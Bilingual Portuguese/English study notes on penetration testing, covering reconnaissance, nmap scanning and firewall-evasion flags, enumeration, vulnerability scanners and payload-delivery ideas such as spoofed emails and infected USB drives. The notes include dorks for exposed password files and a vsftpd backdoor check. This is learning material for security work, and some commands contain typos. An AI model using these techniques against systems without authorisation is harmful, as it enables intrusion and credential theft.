## **Fundamentos**
---
A grosso modo, o objetivo de um hacker ético/penetration tester é fazer um teste de invasão(penetration test), que consiste em utilizar técnicas de hackers para identificar vulnerabilidades em sistemas e redes. A ideia geral é <strong style="color:#d79921">invadir para proteger</strong>.

O <span style="color: #d65d0e">penetration test</span> é a ferramenta principal de um <span style="color: #d65d0e">ethical hacker</span>.

- **Tipos de penetration test**:
	- <span style="color: #689d6a">Black box</span> <span style="color: #3588E9">--></span> teste realizado em um sistema remoto, sem nenhum conhecimento do alvo. É o mais caro, pois exige mais trabalho do pen tester. Esse teste visa demonstrar a visão de um atacante de fora da intranet da empresa. É o teste mais realizado.
	- <span style="color: #689d6a">Grey Box</span> <span style="color: #3588E9">--></span> teste realizado entre departamentos ou sub-redes de uma intranet, com conhecimento parcial da estrutura. A ideia deste teste é mostrar uma visão entre departamentos.
	- <span style="color: #689d6a">White Box</span> <span style="color: #3588E9">--></span> teste realizado em uma intranet local, com total conhecimento do alvo. Mostra o que um administrador de rede da empresa consegue fazer caso ele tente causar algum dano.
---
- **Fases de um penetration test**:
	- <strong style="color: #689d6a">Reconhecimento</strong> <span style="color: #3588E9">--></span> pesquisa sobre o sistema. Ex: identificar informações sobre o domínio, dados importantes que estão no site da empresa, identificar sistemas básicos.
	- <strong style="color: #689d6a">Varredura</strong> <span style="color: #3588E9">--></span> pega as informações da realizadas na fase de reconhecimento, e usa técnicas de varredura de endereços IP e portas, para identificar serviços. Ex: quantos computadorss há na rede, o nome deles, o endereço ip de cada um, etc. Consegue identificar o máximo de recursos necessários e até algumas vulnerabilidades.
	- <strong style="color: #689d6a">Ganhando o acesso</strong> <span style="color: #3588E9">--></span> pega todas as informações coletadas anteriormente. Nessa fase o pen tester irá decidir quais tecnicas serão utilizadas para ganhar o acesso. Ex: tentar explorar uma falha, rodar um exploit, tentar capturar o tráfego da rede.
	- <strong style="color: #689d6a">Mantendo o acesso</strong> <span style="color: #3588E9">--></span> fase na qual o pen teste instala algo no sistema para manter o acesso (backdoor). Será realizado aluma coisa caso seja necessário voltar no sistema. Ex: colocar um serviço, agendar algum processo, etc.
	- <strong style="color: #689d6a">Cobrindo rastros</strong> <span style="color: #3588E9">--></span> esta etapa envolve aspectos, desde esconder o endereço IP de origem (ex: uso de <span style="color: #98971a">tor</span> ou servidor <span style="color: #98971a">proxy</span>), apagar logs de acesso, esconder arquivos, usar <span style="color: #98971a">rootkits</span>. Visa cobrir os rastros de quando entrou no sistema.

<span style="color: #d65d0e">Non Disclosure Agreement (NDA)</span> <span style="color: #3588E9">--></span> termo estabelecido entre o cliente e o profissional, no qual é definido até onde o pen tester pode ir.

O <strong style="color:#d79921">relatório</strong> de um Penetration Test deve compilar tudo o que foi encontrado de problema e deverá ser entregue bem detalhado para a empresa  que se esta trabalhando. Há dois tipos de relatório: o <strong style="color:#d79921">sumário executivo</strong> é feito para os executivos da empresa - deve conter gráficos com as vulnerabilidades encontradas, e o <strong style="color:#d79921">relatório técnico</strong>, focado no que foi realizado, é voltado para os profissionais de segurança da empresa. Este último apresenta um passo a passo o resultado da exploração e a sugestão para correção.

<strong style="color: #C6554F">Obs:</strong> O pen tester não arruma a segurança do cliente, ele é contratado para ser um consultor para analisar as vulnerabilidades.

Em um teste de invasão é importante anotar no relatório toda informação que for interessante. Se for encontrado algo que não deveria estar na internet, isso se chama information disclosure. É algo que o cliente não deseja que seja visto, mas que é disponível publicamente.

<span style="color: #3588E9">--></span> Qualquer informação que se consegue durante a fase de <strong style="color:#d79921">footprint</strong> e <strong style="color:#d79921">enumeração</strong> é útil.
## **Reconhecimento (Reconnaissance)**
---
Also known as <span style="color: #d65d0e">Information Gathering</span> or <span style="color: #d65d0e">Footprint</span>, this stage gather information(system, network, organization) about the target to better plan the attack. This step of penetration test is the only one that <strong style="color:#d79921">can be performed on any website</strong> for a target, since information about something <strong>is not illegal</strong>. Essa fase ajuda ajuda a identificar pontos fracos na infraestrutura de uma organização. Nessa fase, procura-se obter informações como: <span style="color: #689d6a">detalhes da infraestrutura de rede, sistemas operacionais, aplicaçõe web, endereços IP, informações de DNS, etc</span>. Essa fase também procura identificar as possíveis vulnerabilidades.

There are two types of <span style="color: #d65d0e">Information Gathering</span>: <strong style="color:#d79921">active</strong> and <strong style="color:#d79921">passive</strong>.

Any action where we <strong>exchange something</strong> with the target is <span style="color: #d65d0e">Active Information Gathering</span>.

Usually active "Information Gathering" will provide with much more important data then passive "Information Gathering", since the interaction with the target is direct.
<span style="color: #d65d0e">Passive Information Gathering</span> has a <strong>intermediate system</strong>, that could be anything from a search engine to a website, but it could also be a person.

Usually the first thing that is searched to identify a target, is their IP address/addresses. This could be, for example, a company that has servers and buildings all around the world. But the <strong>most</strong> <span style="text-decoration: underline; color: #c6554f">important</span> thing are the <strong style="color:#d79921">technologies</strong> the target has.

<span style="color: #3588E9">--></span> A fase de <span style="color: #d65d0e">Footprint</span> é uma fase <strong style="color:#d79921">não intrusiva</strong>, são consultas feitas em <strong>informações públicas</strong> 

###### **Footprint offline**:

<strong style="color: #689d6a">Engenharia social presencial</strong> <span style="color: #3588E9">--></span> Técnicas de conversação e persuasão para obter informações diretamente de funcionários ou indivíduos associados a uma organização. Fingir ser um funcionário, técnico de manutenção, ou visitante para acessar fisicamente áreas restritas.

<strong style="color: #689d6a">Observação direta ou vigilancia físca</strong> <span style="color: #3588E9">--></span> Uso de binóculos, câmeras de longo alcance ou outros dispositivos de observação para monitorar instalações ou indivíduos. Vigilância física para entender a rotina, segurança, e procedimentos de uma organização.

<strong style="color: #689d6a">Dumpster diving</strong> <span style="color: #3588E9">--></span> Procurar em lixeiras ou sistemas de descarte de uma organização por documentos descartados (notas, drives USB, outros materiais que podem conter informações sensíveis)

<strong style="color: #689d6a">Pesquisas em registros publicos</strong> <span style="color: #3588E9">--></span> Acesso a documentos públicos como registros de propriedade, documentos legais, e arquivamentos regulatórios que podem fornecer informações sobre uma organização ou indivíduo.

<strong style="color: #689d6a">Conferencias e eventos de networking</strong> <span style="color: #3588E9">--></span> Participar de eventos, conferências e feiras para coletar informações através de conversas, distribuição de materiais, e observação de demonstrações.

###### **Active information gathering**:

The Linux machine is used to get as much data or as much information about the target while interacting with them. It could be a target website that will be tested or could also be a network or an entire company.

The main point is to directly get the data from the target.

- use the <span style="color: #98971a">ping</span> tool get the target IP address:
	- <code><span style="color:#98971a">$ ping <span style="color:#689d6a">ect.bg.ac.rs</span> <span style="color:#7b7b7d"># can be any link</span></span></code>
	- <span style="color: #3588E9">--></span> the <span style="color: #98971a">ping</span> tool is installed by default in any operation system. By pinging any website, we're sending ICMP packets to the website and if we get responses back, that means the website is up and running.
	- besides the response the ping tool we will get the IP address.
	- if we don't get any response from a website, it is probably blocking ping probes, which some websites often do.
	- o ping pode ser utilizado para realizar uma <strong style="color:#d79921">resolução reversa</strong>, pois ele normalmente retorna o nome do endereço IP.

- use <span style="color: #98971a">nslookup</span> tool to get the  IP from a website
	- `nslookup etf.bg.ac.rs # it can be any website`
	- <span style="color: #3588E9">--></span> <span style="color: #98971a">nslookup</span> pode ser ulizado para consultar a zona reversa do endereço.

- O utilitário <span style="color: #98971a">dig</span> permite extrair informações de DNS.
	- `dig -h` --> show more info about the tool
	- `dig navinet.com.br -t ns` --> procura por servidores DNS
		- a opção -t defini o tipo a ser procurado
	- `ig axfr navinet.com.br @ns2.navinet.com` --> verifica se o sistema é ou não vulnerável
		- axfr --> tranferencia de zona xfr
	- a ferramenta <span style="color: #98971a">Google Dig</span> permite executar o utilitário dig pela web.

- A ferramenta <span style="color: #98971a">dnsenum</span> permite extrair informações de nomes de dominio. No caso, ela irá fazer um tipo de força bruta de subdominios
	- `sudo apt install dnsenum` --> instalar a ferramenta
	- `cd /usr/share/dnsenum/` --> local da lista de subdomínios
	- `dnsenum -f dns.txt`  --> executa a ferramenta

- A ferramenta <span style="color: #98971a">dirb</span> procura por arquivos e diretórios existentes no servidor, realiza força bruta para localizar arquivos e pastas.
	- sudo apt install dirb --> instala ferramenta
	- dirb http://scanme.nmap.org/ common.txt --> so básico do dirb
	- http://scanme.nmap.org/ --> site fornecido pelo próprio nmap para testar as ferramentas
	- grep '^e\w' common.txt --> estrai todas as palavras que começam com a letra "e"
	-  grep '^e\w' common.txt | dirb http://scanme.nmap.org/ --> busca pela expressão regular no site
	- grep '^e\w' common.txt > e.txt --> outra forma de fazer
	- dirb http://scanme.nmap.org/ e.txt

- use <span style="color: #98971a">whatweb</span> to scan websites:
	- sudo apt install whatweb --> instalar a ferramenta
	- whatweb arh.bg.ac.rs --> run on the default aggression level
	- whatweb arh.bg.ac.rs --verbose --> run on verbose mode
	-  whatweb arh.bg.ac.rs --aggression 3 -v --> use another aggresion level
	- whatweb arh.bg.ac.rs --aggression 3 -v --no-errors --log-verbose=results
		- save the scan's results in a file
	- The tool <span style="color: #98971a">whatweb</span> is used to gather information and to scan any website on the internet. WhatWeb works by sending HTTP requests to a website and analyzing the responses received from the server. It then identifies various aspects of the website by analyzing the headers, HTML, JavaScript, and other page elements.
	- <span style="color: #98971a">Whatweb</span> supports an aggression level to control the trade off between speed and reliability. The <strong>default</strong> level of aggression, is called "<strong style="color:#d79921">stealthy</strong>", is the fastest and requires only one HTTP request of a website. More aggressive modes were developed for use in penetration tests.
##### **Passive information gathering**

Essa fase involve realizar buscas na Web (motores de busca, website, redes sociais). Em motores de busca por exemplo, pode-se procurar por endereços IP ou servidores não indexados (exemplo: Dork). 

Também se usa nessa fase, técnicas de engenharia social (exploração do DNS, identificação de IPs, coleta de informações via e-mails).
###### <strong style="color: #689d6a">Ferramentas para <span style="color: #d65d0e">Footprinting</span> na Web</strong>:

<span style="color: #98971a">Whois</span> <span style="color: #3588E9">--></span> serviço de consulta de informações de dominios de ips.
- <span style="color: #98971a">Ip checker</span>
- A aplicação <span style="color: #98971a">web dnslytics</span>, possui um plugin que pode ser instalado no browser, funciona como um super whois.

O serviço <span style="color: #98971a">whois</span> também está disponível em diversas diversas distros do Linux.
- sudo apt install whos is --> para instalar a ferramenta
- whois etf.bg.ac.rs --> usando o comando whois

<span style="color: #3588E9">--></span> o comando <span style="color: #98971a">whois</span> irá retorna as mesmas informações que a aplicação web retorna.

<span style="color: #98971a">Shodan</span> <span style="color: #3588E9">--></span> ferramenta de busca que permite aos usuários encontrar dispositivos conectados à internet, incluindo servidores, webcams, impressoras, etc.
- Alguns exemplos de buscas:
	- net:200.195.16.0/24 --> procura por uma faixa de ip
	- city:"belo horizonte" TP-LINK
	- hostname:virtua.com.br
	- os:"windows xp" --> procura por locais que ainda usam o  windows xp
	- `geo: <coordenadas>`
	- port:21 vsftpd 2.3.4 --> procura por servidor com a porta 21 ativa

<span style="color: #98971a">Censys</span> <span style="color: #3588E9">--></span> Possui a mesma proposta do Shodan, mas com menos recursos.

<span style="color: #98971a">Robotex</span> <span style="color: #3588E9">--></span> shows comprehensive info about the target website.

<span style="color:#98971a">BuiltWith</span> <span style="color: #3588E9">--></span> ferramenta que fornece informações sobre as tecnologias usadas em websites, incluindo servidores web, framework de frontend, e ferramentas de analytics, ou seja, como o site foi feito.

Sites de vagas de emprego, permite encontrar informaçoes da empresa que será feito o teste de invasão.

<span style="color:#98971a">Netcraft</span> <span style="color: #3588E9">--></span> ferramenta que fornece diversas informações sobre um site, incluindo o que esta sendo executado no servidor web e o seu histórico.

<span style="color: #98971a">Google Dorks</span> <span style="color: #3588E9">--></span> Também chamado de Google Hacking, é uso de operadores de busca avancados no Google para encontrar informacoes específicas e sensivieis. Há um algoritmo complexo por trás da busca feita no site da Google. Ex: os resultados da busca são posicionado com base em um rank.
- Algumas buscas:
	- intitle:escola --> retorna tudo que for no titulo escola
	- inurl --> signica no endereço. inurl:admin, inurl:access.log
	- intext --> busca no texto. Ex: intext:politica
	- filetyepe --> especifica um tipo de arquivo para ser acessado
	- site:gov.br filetype:txt password
	- Quando se tem no titulo index of, é porque é um diretorio não indexado.
	- Diretório não indexado significa que se pode visualizar o conteúdo do diretório.
	- `"index of /*" site:gov.br`

<span style="color:#98971a">Wayback Machine</span> é uma aplicação web que permite visualizar versão anteriores de qualquer website.

<span style="color:#98971a">DeepSerch</span> <span style="color: #3588E9">--></span> ferramenta  acessada pela rede tor, permite pesquisar diversos leaks.

<span style="color:#98971a">Dehashed</span> <span style="color: #3588E9">--></span> alternativa paga ao DeepSearch.

<span style="color:#98971a">Breach Directory</span> <span style="color: #3588E9">--></span> outra alternativa ao DeepSearch que também permite pesquisar por vazamentos, porém é limitado.

<span style="color: #d65d0e">Exploit.in</span> <span style="color: #3588E9">--></span> conjunto de vazamentos que compilaram vazamentos que saíram em vários locais.
###### <strong style="color: #689d6a">Ferramentas para <span style="color: #d65d0e">Footprinting</span> de E-mail</strong>:

<span style="color:#98971a">Hunter.io</span> <span style="color: #3588E9">--></span> permite aos usuários encontrar endereços de e-mails associados a um determinado dominio e é util para mapear a estrutura de uma organização

<span style="color:#98971a">TheHarvester</span> <span style="color: #3588E9">--></span> ferramenta de codigo aberto para coletar endereços de e-mail, nomes de host, nomes de empresass, e links de um domínio. A ferramenta automatiza vários processos. Ela pode recolher informações de DNS reverso, fazer força bruta nos domínios, pode estrair os resultado em diferentes formatos e pode até usar o shodan. de codigo aberto para coletar endereços de email, nomes de hosts, nome de empresaes, e links de um dominio.
- using theHarvester:
	- theHarverster -h --> exibe as opções
	- theHarverster -d www.uol.com.br -l 200 -b google -h
		- -l --> defini o limite para o número de resultados
		- -b --> defini o mecanismo de busca
		- -h --> joga para o shodan caso tenha algum ip
	- theHarverster -d www.uol.com.br -b google

Outra ferramenta interessante é a <span style="color: #98971a">Sn1per</span>.
- using Sn1per:
	- sniper -h
	- sniper -t scanme.nmap.org -o -re
		- -t --> defini o alvo/host
		- -o --> tenta descobrir informações sobre o sistema
		- -re --> realizar o reconhecimento


<span style="color:#98971a">pwned</span> <span style="color: #3588E9">--></span> ferramenta que verifica se um determinado email foi hackeado ou não.
###### <strong style="color: #689d6a">Ferramentas para Análise de DNS</strong>:

<span style="color:#98971a">DNSdumpster</span> <span style="color: #3588E9">--></span> recuso online gratuito que pose ser usado para descobrir registros de DNS relacionados a uma domínio.

<span style="color:#98971a">MXToolBox</span> <span style="color: #3588E9">--></span> ferramenta que oferece uma série de serviços de diagnóstico de DNS e rede, incluindo a busca de registros MX e a analise de saúde do servidor de e-mail.
###### <strong style="color: #689d6a">Ferramentas de Mapeamento de Rede</strong>:

<a href=https://nmap.org/><span style="color:#98971a">Nmap</span> <span style="color: #3588E9">--></span> ferramenta para mapeamento de rede que identifica dispositivos e serviços em uma rede.

<a href=https://www.wireshark.org/><span style="color:#98971a">Wireshark</span> <span style="color: #3588E9">--></span> analisador de rede que permite capturar e analisar o trafego de rede em tempo real.
###### <strong style="color: #689d6a">Ferramentas de Engenharia Social</strong>:

<span style="color:#98971a">ReadNotify</span> é um website que permite enviar um email para alguem e visualizar os dados dela.

<span style="color:#98971a">Maltego</span> <span style="color: #3588E9">--></span> ferramenta usada para coletar informacoes de várias fontes, incluindo redes sociais, para construir um grafico de relaçoes.

<span style="color:#98971a">Grabify</span> é um site que permite gerar um link, que irá redirecionar para um endereço qualquer desejado.

O software <a href=https://github.com/ElevenPaths/FOCA><span style="color: #98971a">FOCA</span></a> é um software para analizar metadados de arquivos. Ele permite analizar, buscar na internet ou jogar dentro dela uma quantidade de documentos para ele canalizar os metadados.

<a href=https://www.trustedsec.com/resources/tools/the-social-engineer-toolkit-set><span style="color: #98971a">Social-Engineer Toolkit(SET)</span></a> <span style="color: #3588E9">--></span> pode ser usado para coletar informacoes disponíveis publicamente em rede sociais.
## **Varredura (Scanning)**

Is a deeper form of information gathering using technical tools to find opening in the target and in the systems that it's been attacked. These openings can be gateways, open ports, operating system that target runs. Essa etapa faz parte da fase de Footprint.

In the scanning, we are mainly focused on technology side, so we want to find out as much as we can about our target's Technical aspect

In this step, we also perform vulnerability scanning, which is just searching for vulnerable software in the target system or network that could possible be exploited

<strong style="color: #c6554f">Scanning is something that we are not allowed to do on any target that we want!!</strong>

<span style="color:#d65d0e">Scanning</span> a vulnerable machine, it means directly exchange packets with the target and once that target sends packets back, hopefully it'll discover something about the target machine that can be useful. It will send to the target <span style="color:#d65d0e">TCP</span> and <span style="color:#d65d0e">UDP</span> packets.

<span style="color:#d65d0e">TCP</span> and <span style="color:#d65d0e">UDP</span> are just <strong style="color:#d79921">protocols</strong> that are used for sending bits of data, also known as <strong style="color:#d79921">packets</strong>.

<span style="color:#d65d0e">Scanning</span> and <span style="color:#d65d0e">Information Gathering</span> really <strong>means</strong> that the attacker is going to <strong style="color:#d79921">look for virtual open ports</strong> that every machine has and it uses them to host their software and communicate with other machines over the internet.

<span style="color:#d65d0e">Externally Scanning</span> <span style="color: #3588E9">--></span> scanning the port while not being in the same network as the target.

<span style="color:#d65d0e">Internally Scanning</span> <span style="color: #3588E9">--></span> scanning machines over the same network or performing network penetration testing inside of some company. Example: find port 21(FTP) to be open.

The <strong style="color:#d79921">highest secured machines</strong> are the ones that <strong style="color:#d79921">have all ports closed</strong> <span style="color: #3588E9">--></span> usually home devices.

The problem occurs when in a company that uses a specific port, like 21 to file transfer, has a software that it's used to open the port which it's outdated and has a vulnerability.

In the <span style="color:#d65d0e">Scanning</span> phase the <strong>goal</strong> is only to <strong style="color:#d79921">scan the target for open ports</strong>, and then <strong style="color:#d79921">discover what software are they running</strong> on those ports.

<span style="color: #98971a">Metasploitable</span> é uma <strong style="color:#d79921">máquina virtual vulnerável</strong> utilizada para realizar a etapa de varredura de um teste de invasão.

The first part of scanning the network is to figure out how many hosts are active and what are their IP addresses. For that, different tools will be used, like <span style="color: #98971a">arp</span> tool.

The <span style="color: #98971a">arp</span> tool which is also a packet, it uses packets to discover hosts on the network.
- Arp tool
	- retora as opções da ferramenta
		- `sudo arp --help`
	- exemplo de uso
		- `sudo arp -a`
	- <span style="color: #3588E9">--></span> uma das desvantagens dessa ferramenta, é que nem sempre ela consegue descobrir os hosts. As vezes é necessário utilizar o <span style="color: #98971a">ping</span> para exibi-los.

The <span style="color: #98971a">netdiscover</span> tool is a much better option than <span style="color: #98971a">arp</span>.
```bash
sudo netdiscover # will find all of the available devices on my network on its own
netdiscover -r 192.168.0.0/24 # specify an ip range for the whole subnet
```

É possivel também utilizar o <span style="color: #98971a">Shodan</span> para realizar varreduras. A base de dados do shodan vem de varreduras do nmap.
```{}
net:200 131.250.0/24 port:21 --> filtra por porta
net:200 195.16.0/24 os: "widnows xp" --> filtra por sistema operacional
```
###### <strong style="color: #689d6a">Nmap - network scanner</strong>:

A ferramenta <span style="color: #98971a">nmap</span> é um <strong style="color:#d79921">network mapper</strong>, é um scanner gratuito e open-source que <strong style="color:#d79921">permite descobrir hosts em uma determinada faixa de rede</strong>, descobrir as portas desses host e identificar os serviços. 

O nmap possui <span style="color: #98971a">NSE scripts</span> que permite descobrir servidores ftp anonimo, e realizar vários tipos de ataques complementares que melhoram a usabilidade do software.
- exibe as opções
	- `nmap -h | less`
- teste com o nmap
	- `nmap scaname.nmap.org`
- exemplo de varredura --> faz um ping scan
	- `nmap IP`
- varredura em modo verbose
	- `namp IP -v` --> exibi em tempo real o que esta acontecendo
- scan em rede local
	- sn --> ping scan, apenas detecta os hosts na rede. Opcão padrão para varredura.
	- `nmap -sN -n 192.168.1.0/24` --> -n não resolver DNS
- extrai apenas os IPs da rede para um arquivo 
	- `nmap -sN -n 192.168.1.0/24 | grep 192 | cut -d ' ' -f 5 > addresses`
---
- <strong style="color: #98971a">Nmap Scan Types</strong>
	- meia conexão, realiza metade da conexão na porta TCP
		- `sudo nmap -sS `
	- conexão completa, mais fácil de ser detectada.
		- `nmap -sT 192.168.0.38` --> não precisa de sudo
	- Para descobrir portas UDP
		- `sudo nmap -n -sU 192.168.0.38`
	- Coloca as portas sequencialmente
		- `nmap -r 192.168.0.38`
	- filtra por uma faixa de portas e salva em um arquivo
		- `nmap 192.168.0.0/24 -p 21-23 -oN resultado-ftp`
	- to scan one port
		- `nmap -p 80 192.168.0.38`
	- scan selected ports
		- `nmap -p 80,22,100 192.168.0.38`
	- scan top 100 use ports
		- `nmpa -F 192.168.0.38`
	- save the scan on a file
		- `sudo nmap -sS 192.168.0.38 >> ouputofscan.txt`

<span style="color: #98971a">scaname.nmap.org</span> <span style="color: #3588E9">--></span> subdomínio disponibilizado pelo nmap para testar o programa.

nmap scans can take hours to finish, which it will depend on where the target is, how many ports are open, are they protect by firewall, etc.

Por padrão o nmap não tenta as portas sequencialmente. Umas das forma de detectar se a varredura esta sendo feita, é saber como as portas estão sendo descobertas.

<span style="color: #3588E9">--></span> By default Nmap, scans the most known 1000 ports. It doesn't scan all 65000.

- <strong style="color: #98971a">Burlando firewalls</strong>
	- Idle scan, aproveita um host com uma porta qualquer para varrer um outro IP.
		- `nmap -sI 192.168.0.38:4451`
	- scan with tiny fragmented IP packets. 
		- `sudo nmap -f 192.168.0.38`
	- split the packets into 16 bytes per fragment
		- `sudo nmap -f -f <IP>`
	- to inscrease fragment size
		- `sudo nmap --mtu -f <IP> # the offset specified must be on multiple of eight`
	- hide the IP address, create decoys.
		- `sudo nmap -D 192.168.0.38`
	- create random IP address
		- `sudo nmap -D RND:5 192.168.0.38 -sS # only works outside the local network`
	- specifying IP addresses
		- `sudo nmap -D 192.168.1.2,192.168.1.5,192.168.1.15,ME 192.168.0.38 # use these IPs to scan the target`
	- Spoofing
		- `sudo namp -S 8.8.8.8 -Pn -e eth0 -g 7777 # only works with -Pn option`
	- FIN scan
		- `sudo nmap -sF 192.168.0.38`
	- combine options with Timing Template
		- `sudo namp -S 8.8.8.8 -Pn -e eth0 -g 7777 -T 1`
---
- <strong style="color: #98971a">Nmap command options</strong>
	- <span style="color: #98971a">-f</span> <span style="color: #3588E9">--></span> split TCP headers over several packets to make it harder for packet filters or intrusion systems to detect.
	- <span style="color: #98971a">--mtu</span> <span style="color: #3588E9">--></span> only works if a networks that is being scanned can afford the hit that this will cause.
	- <span style="color: #98971a">-D</span> <span style="color: #3588E9">--></span> creating decoys can makes it appear to the target as it has been scanned. But the intrusion detection system will not be able to determine which one is real.
	- <span style="color: #98971a">-S</span> <span style="color: #3588E9">--></span> spoof the attacker IP address. It will the target think that someone else is scanning them.
	- <span style="color: #98971a">-Pn</span> <span style="color: #3588E9">--></span> used to assume that all hosts are online. Para não pingar o meu IP antes.
	- <span style="color: #98971a">-e</span> <span style="color: #3588E9">--></span> used to specify a network interface.
	- <span style="color: #98971a">-g</span> <span style="color: #3588E9">--></span> used to specify the source port. Can sometimes help to bypass a firewall.
	- Spoofing com a opção <span style="color: #98971a">-S</span> não é interessante, pois a resposta da varredura vai para o IP falso.
## **Enumeração (Enumeration)**

O processo de <span style="color: #d65d0e">Enumeração</span> envolve identificar os serviços por trás de cada porta, a versão do serviço e do sistema operacional, e também enumerar as informações (quantos usuários e informações no sistema). Essa fase também envolve buscar as falhas de cada serviço. 

O <strong>objetivo</strong> dessa fase é <strong style="color:#d79921">recolher informações sobre os serviços descobertos</strong> durante a <span style="color: #d65d0e">Varredura</span>.

Uma forma mais básica de descobrir qual tipo de serviço o alvo esta rodando é simplesmente realizar a conexão.

- <code><span style="color:#98971a">$ ftp <span style="color:#689d6a">192.168.1.111</span> <span style="color:#7b7b7d"># irá retornar o tipo de serviço</span></span></code>

<span style="color: #98971a">netcat</span> <span style="color: #3588E9">--></span> utilitário para conectar e interagir com qualquer porta. Considerado por muitos como o "Canivete Suiço do TCP/IP", permite agir como cliente ou como servidor.

```bash
nc 192.168.1.111 80
GET / # retorna a pagina principal

nc 192.168.0.38 80
HEAD # retorna o cabeçalho da página
```

Um <span style="color: #d65d0e">banner</span> é uma informação exibida por um host que fornece detalhes sobre o serviço ou sistema, como versão de software, sistema operacional e outros fatos. Banners são simplesmente as informações que uma porta aberta irá fornecer. Os banners geralmente contêm divulgação de informações (information disclosure), ou seja, eles podem fornecer a versão exata do software executado em uma porta aberta.

<span style="color: #d65d0e">Captura de banners</span> é pegar os serviços descobertos e conectar nas portas. Entretanto, possui uma alta probabilidade de passar informações falsas.

<span style="color: #d65d0e">Fingerprint</span> <span style="color: #3588E9">--></span> analise de impressão digital. É basicamente a identificação dos serviços que estão rodando.

- <strong style="color:#689d6a">Fingerprint com Nmap</strong>
	- identifica o sistema operacional
		- nmap -O 192.168.0.38
	- identifica os serviços
		- `nmap -A <IP> # demora mais, pois faz o fingerprint no SO dos serviços`
		- `nmap -sV <IP> # analisa os serviços e retorna a analise do fingerprint`
	- define a intensidade do scan
		- `sudo nmap -sV --version-intensity 9 192.168.0.38 # o padrão é 7`

Sequência a ser seguida desde o fase de Reconhecimento até a fase de Enumeração:
- *descobrir os hosts* **-->** *identificar portas abertas* **-->** *identificar os serviços*.

<span style="color: #98971a">honey pot</span> <span style="color: #3588E9">--></span> purposely vulnerable virtual environment that is used to lure in hackers, in order to find out whether they're being attacked.

- <strong style="color:#689d6a">Enumeração de informações com Nmap Scripts</strong>:
	- usando nfs
		- `/usr/share/nmap/scripts$ ls | grep nfs`
		- `/usr/share/nmap/scripts$ nmap --script=nfs-showmount.nse 192.168.0.38`
	- usando modulos smb para sistemas Windows
		- `/usr/share/nmap/scripts$ nmap --script=smb-enum-shares.nse 192.168.1.112`
	- para obter um help sobre um script
		- `/usr/share/nmap/scripts$ nmap --script-help mysql-info.nse`
	- enumerar usuários em um servidor smtp
		- `/usr/share/nmap/scripts$ nmap 192.168.0.38 --script smtp-enum.nse`

Exemplo de busca de vulnerabilidade:  
- <code><span style="color:#98971a">$ vsftpd <span style="color:#689d6a">2.3.4 cve</span> <span style="color:#7b7b7d"># irá retornar o tipo de serviço</span></span></code>

<span style="color: #98971a">cve</span> <span style="color: #3588E9">--></span> listas de vulnerabilidades cadastradas para serem consultadas, elas exibem as falhas mais recentes assim como o nível de risco(score).

<span style="color: #98971a">cvedetails</span> <span style="color: #3588E9">--></span> site que exibe produtos e a categoria de suas vulnerabilidades.
## **Análise de Vulnerabilidades (Vulnerability Analysis)**

A fase de <span style="color: #d65d0e">Análise de Vulnerabilidade</span> utiliza todas as informações obtidas durante a fase de enumeração, com o objetivo de descobrir se o alvo possui algumas vulnerabilidades. Uma ferramenta bastante útil para essa fase é o <span style="color: #98971a">Nmap</span> que possui uma série de scripts para analisar vulnerabilidades.

<span style="color: #98971a">Nmap Scripts</span> <span style="color: #3588E9">--></span> é um recurso que o Nmap possui, que permite que os usuários escrevam (e compartilhem) scripts simples (usando a linguagem de programação Lua) para automatizar uma ampla variedade de tarefas de rede. 

Os scripts do Nmap são comumente utilizados ​​na varredura para detectar diferentes vulnerabilidades de serviço, mas também podem ser usados ​​para ataques de força bruta. Ele pode ser usado para detectar malware na máquina de destino. Também é utilizado para coletar ainda mais informações sobre bancos de dados e outros serviços de rede.

- Para rodar os scripts do nmap:
	- `cd /usr/share/nmap/scripts`
	- `nmap --script-help` --> ajuda
	- script do banner
		- `nmap 192.168.0.38 -p 25 --script banner.nse`
	- script para verficar arquivos e pastas
		- `nmap --script=nfs-ls 192.168.0.38 `
	- verifica backdoor no vstfpd
		- `nmap --script ftp-vsftpd-backdoor.nse --script-args ftp-vsftpd-backdoor.cmd="ls" 192.168.0.38`

To search for a vulnerability on Google: <code><span style="color:#98971a">$ vsftpd <span style="color:#689d6a">2.3.4 exploit</span></span></code>
###### <strong style="color:#689d6a">Scanners de vulnerabilidades</strong>:

<span style="color: #98971a">Nessus, Greenbone OpenVAS, nmap vulscan</span>. <span style="color: #3588E9">--></span> scanners genericos

Para utilizar o vulscan do nmap deve-se baixa-lo no github:
- <code><span style="color:#98971a">$ nmap <span style="color:#689d6a">-sV 192.168.0.38 --scipt=vulscan/vulscan.nse</span></span></code>
- Para atualizar a base de dados: <code><span style="color:#98971a">$ cd <span style="color:#689d6a">/vulscan/utilities/updater; ./updateFiles.sh</span></span></code>
- filtrar o teste: <code><span style="color:#98971a">$ nmap <span style="color:#689d6a">-sV 192.168.0.38 --p21,22 --script=vulscan/vulscan.nse --script-args vulscandb=exploitdb.csv</span></span></code>
- No Owasp ZAP a opção use spider - realiza um <span style="color: #d65d0e">crwal</span> <span style="color: #3588E9">--></span> tenta identificar todos os arquivos que tem no site, Owasp ZAP --> especifico de serviços, verifica apenas vulnerabilidades de web

<span style="color: #d65d0e">Sanner de aplicação</span> <span style="color: #3588E9">--></span> verifica falhas em uma aplicação web específica (wpscan)
- instalação no debian via rbenv: <code><span style="color:#98971a">$ sudo <span style="color:#689d6a">gem install wpscan</span></span></code>
- <code><span style="color:#98971a">$ wpscan <span style="color:#689d6a">--url http://patorbanco.pr.gov.br --api-token TOKEN</span></span></code>
```bash
$ nano ~/.wpscan/scan.yml

cli_options:
	api_token: <TOKEN>
```
## **Ganhando Acesso (Gaining Access)**

This step actually involves hacking the target. The information gathered in the first and second phase are used.

<span style="color: #d65d0e">Exploiting</span> (Exploração) the target in other words is using its vulnerability that was discovered to send something called <span style="color: #d65d0e">payload</span>.

<span style="color: #d65d0e">Payload</span> <span style="color: #3588E9">--></span> is is a program that is delivered to the target after the exploit. Usually this program is something that allows the attacker to execute commands (shell) on the target system and navigate through its files and folders. É o código malicioso que será rodado para acesso ao Sistema Operacional após corromper o sistema.

- <span style="color:#b16286">Some ways of delivering a payload</span>:
	- send an email containing the payload that is perhaps masked to look like an image or a different file type.
	- spoof our email address so it looks like someone that our target knows, so they would never think that the image we send could contain something malicious
	- plug an infected USB drive in the target machine and execute payload manually.

<span style="color: #d65d0e">exploitable vulnerability</span> <span style="color: #3588E9">--></span> is a vulnerability that attackers can exploit to gain unauthorized access, disrupt services, or steal data. This can be for example, a code with a critical bug which an attacker will use it to make the software act in a way that it is not intended to.

